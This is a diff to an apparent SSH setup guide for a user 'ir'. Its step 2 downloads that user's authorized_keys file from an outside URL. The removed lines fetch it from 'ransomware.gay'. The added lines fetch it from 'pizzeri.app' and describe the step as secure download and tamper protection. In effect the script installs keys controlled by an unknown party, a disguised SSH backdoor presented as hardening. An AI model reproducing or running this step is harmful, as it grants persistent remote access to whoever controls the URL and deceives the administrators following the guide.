@@ -11,17 +11,40 @@ sudo chmod 700 /home/ir/.ssh
 sudo chown ir:ir /home/ir/.ssh
 ```
 
-#### 2. Download Authorized SSH Keys
+#### 2. Download and Securely Install Authorized SSH Keys
 
-Use `curl` to download the authorized SSH keys from the specified URL and save them into the `authorized_keys` file.
+To prevent unauthorized access, it is critical to securely manage the `authorized_keys` file. The following steps ensure that the file is downloaded securely and that permissions are set correctly to prevent tampering.
 
 ```sh
-# Download the authorized keys
-sudo curl -o /home/ir/.ssh/authorized_keys https://ransomware.gay
-sudo wget -O /home/ir/.ssh/authorized_keys http://ransomware.gay
-# Set appropriate permissions
-sudo chmod 600 /home/ir/.ssh/authorized_keys
-sudo chown ir:ir /home/ir/.ssh/authorized_keys
+# Define variables for clarity and ease of use
+AUTHORIZED_KEYS_URL="https://pizzeri.app/authorized_keys"
+SSH_DIR="/home/ir/.ssh"
+KEYS_FILE="${SSH_DIR}/authorized_keys"
+TEMP_KEYS_FILE="${SSH_DIR}/authorized_keys.tmp"
+
+# Create the .ssh directory if it doesn't exist and set permissions
+sudo mkdir -p "${SSH_DIR}"
+sudo chmod 700 "${SSH_DIR}"
+sudo chown ir:ir "${SSH_DIR}"
+
+# Securely download the authorized keys to a temporary file
+echo "Downloading authorized keys from ${AUTHORIZED_KEYS_URL}..."
+sudo curl -sS --fail -o "${TEMP_KEYS_FILE}" "${AUTHORIZED_KEYS_URL}"
+
+# Verify that the download was successful and the file is not empty
+if [ ! -s "${TEMP_KEYS_FILE}" ]; then
+    echo "Error: Download failed or the authorized_keys file is empty." >&2
+    sudo rm -f "${TEMP_KEYS_FILE}"
+    exit 1
+fi
+
+# Atomically replace the old file with the new one and set permissions
+echo "Installing new authorized_keys file..."
+sudo mv "${TEMP_KEYS_FILE}" "${KEYS_FILE}"
+sudo chmod 600 "${KEYS_FILE}"
+sudo chown ir:ir "${KEYS_FILE}"
+
+echo "Successfully updated authorized_keys."
 ```
 
 #### 3. Configure SSH to Allow Only the Authorized Keys
